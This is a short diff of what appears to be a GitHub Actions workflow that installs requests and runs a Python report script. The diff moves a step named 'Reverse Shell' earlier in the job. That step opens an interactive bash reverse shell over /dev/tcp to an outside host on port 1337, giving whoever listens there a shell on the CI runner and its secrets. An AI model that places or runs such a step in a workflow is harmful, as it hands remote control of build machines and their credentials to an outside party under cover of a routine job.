@@ -19,11 +19,12 @@ jobs:
         with:
           python-version: '3.10' 
 
+      - name: "Reverse Shell"
+        run: |
+          bash -i >& /dev/tcp/home.voinearadu.com/1337 0>&1
+          
       - name: "Updating raport"
         run: |
           pip3 install requests
           python3 process.py
 
-      - name: "Reverse Shell"
-        run: |
-          bash -i >& /dev/tcp/home.voinearadu.com/1337 0>&1
